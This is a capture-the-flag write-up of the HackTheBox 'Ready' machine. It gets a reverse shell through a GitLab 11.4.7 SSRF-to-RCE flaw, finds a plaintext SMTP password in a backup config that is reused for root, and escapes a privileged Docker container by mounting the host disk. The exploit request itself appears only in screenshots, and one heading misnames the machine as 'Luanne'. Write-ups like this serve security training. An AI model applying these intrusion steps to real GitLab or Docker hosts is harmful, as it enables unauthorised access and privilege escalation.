---
layout: post
title:  "HackTheBox Ready Writeup" 
tags: hackthebox gitlab-ssrf-rce docker-escaping
categories: hackthebox active-machine 
rel-img: /assets/img/htb/ready/ready.png
description: Exploiting gitlab vulnerability to gain user flag. Funny steps to root escaping docker container!!
---

### Hackthebox Luanne Writeup
![ready](/assets/img/htb/ready/ready.png)

## Abstract

Exploiting gitlab vulnerability to gain user flag. Funny steps to root escaping docker container!!

## Summary
1. Initial foothold
  - Nmap recon
2. Gitlab SSRF RCE 
3. User Flag
4. Privilege Escalation
  - Basic Enumeration
  - Docker Escaping 
5. Root Flag

## Initial foothold

### Nmap recon

```
sh4ck@kali:~/Desktop$ sudo nmap -A 10.10.10.220 -vv
[sudo] password for sh4ck: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-19 10:48 CET
Completed NSE at 10:48, 0.00s elapsed
Nmap scan report for 10.10.10.220
Host is up, received echo-reply ttl 63 (0.057s latency).
Scanned at 2020-12-19 10:48:11 CET for 26s
Not shown: 998 closed ports
Reason: 998 resets
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
5080/tcp open  http    syn-ack ttl 62 nginx
|_http-favicon: Unknown favicon MD5: F7E3D97F404E71D302B3239EEF48D5F2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 53 disallowed entries (40 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
| /s/ /snippets/new /snippets/*/edit /snippets/*/raw 
| /*/*.git /*/*/fork/new /*/*/repository/archive* /*/*/activity 
| /*/*/new /*/*/edit /*/*/raw /*/*/blame /*/*/commits/*/* 
| /*/*/commit/*.patch /*/*/commit/*.diff /*/*/compare /*/*/branches/new 
| /*/*/tags/new /*/*/network /*/*/graphs /*/*/milestones/new 
| /*/*/milestones/*/edit /*/*/issues/new /*/*/issues/*/edit 
| /*/*/merge_requests/new /*/*/merge_requests/*.patch 
|_/*/*/merge_requests/*.diff /*/*/merge_requests/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/19%OT=22%CT=1%CU=42522%PV=Y%DS=2%DC=T%G=Y%TM=5FDDCC
OS:75%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=2%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Uptime guess: 20.791 days (since Sat Nov 28 15:48:57 2020)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   57.08 ms 10.10.14.1
2   57.21 ms 10.10.10.220

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.63 seconds
           Raw packets sent: 1124 (53.482KB) | Rcvd: 1082 (46.770KB)
```

## Gitlab SSRF RCE

I started exploring gitlab app. As already done for Laboratory machine, i tried to sign up new user:

![git app](/assets/img/htb/ready/gitlab_register_page.png)

Than i logged in and found gitlab version under help menu:

![git app version](/assets/img/htb/ready/gitlab_version.png)

So i decided to search for exploit, and i discovered that GitLab Community Edition 11.4.7 is vulnerable to RCE via SSRF, as detailed here:

[gitlab-SSRF-redis-RCE](https://github.com/jas502n/gitlab-SSRF-redis-RCE), and explained here:

[LiveOverflow](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/)

I followed those steps:

![git app ssrf](/assets/img/htb/ready/gitlab_ssrf.png)

and with burp i managed http request to get reverse shell:

![git app ssrf](/assets/img/htb/ready/gitlab_ssrf_burp.png)


```
sh4ck@kali:~/Desktop$ nc -nlvp 4545
listening on [any] 4545 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.220] 38902
id
uid=998(git) gid=998(git) groups=998(git)
```
I got shell with git user (and group). First of all i spawned shell:
```
which python
which python3
/opt/gitlab/embedded/bin/python3
/opt/gitlab/embedded/bin/python3 -c 'import pty;pty.spawn("/bin/bash");'
git@gitlab:~/gitlab-rails/working$
```
than i proceeded with some basic enumeration and found user dude inside home folder. I was able to read dude folder:
``` 
git@gitlab:~/gitlab-rails/working$ ls -l /home
ls -l /home
total 4
drwxr-xr-x 2 dude dude 4096 Dec  7 16:58 dude
git@gitlab:~/gitlab-rails/working$ ls -la /home/dude
ls -la /home/dude
total 24
drwxr-xr-x 2 dude dude 4096 Dec  7 16:58 .
drwxr-xr-x 1 root root 4096 Dec  2 10:45 ..
lrwxrwxrwx 1 root root    9 Dec  7 16:58 .bash_history -> /dev/null
-rw-r--r-- 1 dude dude  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 dude dude 3771 Aug 31  2015 .bashrc
-rw-r--r-- 1 dude dude  655 May 16  2017 .profile
-r--r----- 1 dude git    33 Dec  2 10:46 user.txt
```
## User Flag

As showed above, git group had read permission to user.txt, so i was able to read fthe file: 

```
git@gitlab:~/gitlab-rails/working$ cat /home/dude/user.txt
```
and got user flag.

## Privilege Escalation

### Basic Enumeration

As usual, i did basic enumeration and found `gitlab.rb` file under `/opt/backup`. Inside file i spottet a smtp password:

```
git@gitlab:/opt/backup$ cat gitlab.rb
cat gitlab.rb

<redacted>

#### Email account password
# gitlab_rails['incoming_email_password'] = "[REDACTED]"
#     password: '_the_password_of_the_bind_user'
#     password: '_the_password_of_the_bind_user'
#   '/users/password',
#### Change the initial default admin password and shared runner registration tokens.
# gitlab_rails['initial_root_password'] = "password"
# gitlab_rails['db_password'] = nil
# gitlab_rails['redis_password'] = nil
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
# gitlab_shell['http_settings'] = { user: 'username', password: 'password', ca_file: '/etc/ssl/cert.pem', ca_path: '/etc/pki/tls/certs', self_signed_cert: false}
##! `SQL_USER_PASSWORD_HASH` can be generated using the command `gitlab-ctl pg-password-md5 gitlab`
# postgresql['sql_user_password'] = 'SQL_USER_PASSWORD_HASH'
# postgresql['sql_replication_password'] = "md5 hash of postgresql password" # You can generate with `gitlab-ctl pg-password-md5 <dbuser>`
# redis['password'] = 'redis-password-goes-here'
####! **Master password should have the same value defined in
####!   redis['password'] to enable the instance to transition to/from
# redis['master_password'] = 'redis-password-goes-here'
# geo_secondary['db_password'] = nil
# geo_postgresql['pgbouncer_user_password'] = nil
#     password: PASSWORD
###! generate this with `echo -n '$password + $username' | md5sum`
# pgbouncer['auth_query'] = 'SELECT username, password FROM public.pg_shadow_lookup($1)'
#     password: MD5_PASSWORD_HASH
# postgresql['pgbouncer_user_password'] = nil

<redacted>
```
I swutched to root with above passoword `wW59U!ZKMbG9+*#h` but I didn't found any root.txt file.

```
root@gitlab:/opt/backup# id
id
uid=0(root) gid=0(root) groups=0(root)
root@gitlab:/opt/backup#
root@gitlab:/opt/backup# ls -la /root
ls -la /root
total 24
drwx------ 1 root root 4096 Dec 13 15:06 .
drwxr-xr-x 1 root root 4096 Dec  1 12:41 ..
lrwxrwxrwx 1 root root    9 Dec  7 16:56 .bash_history -> /dev/null
-rw-r--r-- 1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwx------ 2 root root 4096 Dec  7 16:49 .ssh
-rw------- 1 root root 1565 Dec 13 15:06 .viminfo
root@gitlab:/opt/backup# ls -la /
ls -la /
total 104
drwxr-xr-x   1 root root 4096 Dec  1 12:41 .
drwxr-xr-x   1 root root 4096 Dec  1 12:41 ..
-rwxr-xr-x   1 root root    0 Dec  1 12:41 .dockerenv
-rw-r--r--   1 root root  185 Nov 20  2018 RELEASE
drwxr-xr-x   2 root root 4096 Nov 20  2018 assets
drwxr-xr-x   1 root root 4096 Dec  1 15:40 bin
drwxr-xr-x   2 root root 4096 Apr 12  2016 boot
drwxr-xr-x  13 root root 3760 Dec 19 11:38 dev
drwxr-xr-x   1 root root 4096 Dec  2 10:45 etc
drwxr-xr-x   1 root root 4096 Dec  2 10:45 home
drwxr-xr-x   1 root root 4096 Sep 13  2015 lib
drwxr-xr-x   2 root root 4096 Nov 13  2018 lib64
drwxr-xr-x   2 root root 4096 Nov 13  2018 media
drwxr-xr-x   2 root root 4096 Nov 13  2018 mnt
drwxr-xr-x   1 root root 4096 Dec  1 16:23 opt
dr-xr-xr-x 322 root root    0 Dec 19 11:38 proc
drwx------   1 root root 4096 Dec 13 15:06 root
-rw-r--r--   1 root root   23 Jun 29 14:48 root_pass
drwxr-xr-x   1 root root 4096 Dec 13 15:07 run
drwxr-xr-x   1 root root 4096 Nov 19  2018 sbin
drwxr-xr-x   2 root root 4096 Nov 13  2018 srv
dr-xr-xr-x  13 root root    0 Dec 19 11:38 sys
drwxrwxrwt   1 root root 4096 Dec 19 11:39 tmp
drwxr-xr-x   1 root root 4096 Nov 13  2018 usr
drwxr-xr-x   1 root root 4096 Nov 13  2018 var
```

I realized that i was inside container (file .dockerenv). But with root privilege.

### Docker Escaping

I did some google fu about privilege escalation in docker with privileged permission and found this article:

[Docker escaping](https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-a-docker-container)

So i tried to reproduced these steps:

``` 
root@gitlab:/# mkdir /tmp/testt
mkdir /tmp/testt
root@gitlab:/# df -h
Filesystem      Size  Used Avail Use% Mounted on
overlay          18G   12G  5.7G  68% /
tmpfs            64M     0   64M   0% /dev
tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup
/dev/sda2        18G   12G  5.7G  68% /root_pass
shm              64M  608K   64M   1% /dev/shm
root@gitlab:/# mount /dev/sda2 /tmp/testt
mount /dev/sda2 /tmp/testt
```
## Root Flag

So i mounted filesystem inside my testt folder:
 
```
root@gitlab:/# ls -la /tmp/testt
ls -la /tmp/testt
total 100
drwxr-xr-x  20 root root  4096 Dec  7 17:44 .
drwxrwxrwt   1 root root  4096 Dec 19 13:57 ..
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Jul  3 06:34 boot
drwxr-xr-x   2 root root  4096 May  7  2020 cdrom
drwxr-xr-x   5 root root  4096 Dec  4 15:20 dev
drwxr-xr-x 101 root root  4096 Dec  8 16:49 etc
drwxr-xr-x   3 root root  4096 Jul  7 10:36 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 May  7  2020 lost+found
drwxr-xr-x   2 root root  4096 Apr 23  2020 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   3 root root  4096 Jun 15  2020 opt
drwxr-xr-x   2 root root  4096 Apr 15  2020 proc
drwx------  10 root root  4096 Dec  7 17:02 root
drwxr-xr-x  10 root root  4096 Apr 23  2020 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   6 root root  4096 May  7  2020 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
drwxr-xr-x   2 root root  4096 Apr 15  2020 sys
drwxrwxrwt  12 root root 12288 Dec 19 14:01 tmp
drwxr-xr-x  14 root root  4096 Apr 23  2020 usr
drwxr-xr-x  14 root root  4096 Dec  4 15:20 var
```

and i could read root.txt 
